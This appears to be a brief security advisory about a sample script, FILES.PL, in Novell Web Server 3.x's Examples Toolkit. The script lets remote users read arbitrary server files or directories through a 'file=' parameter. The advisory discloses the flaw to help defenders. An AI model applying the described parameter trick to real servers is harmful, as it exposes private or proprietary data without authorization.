Novell Web Server 3.x Examples Toolkit v.2 is a package containing example scripts and HTML files to help administrators design web sites. It is not a support Novell product and is provided solely as a convenience to the user. The toolkit contained a script called "FILES.PL" that could be used to view the contents of files or directories on the server by a remote attacker. This is done by passing the parameter "file=<file-or-directory-to-view>" to the script. An attacker could gain information useful in conducting subsequent attacks, or retrieve personal or proprietary information.
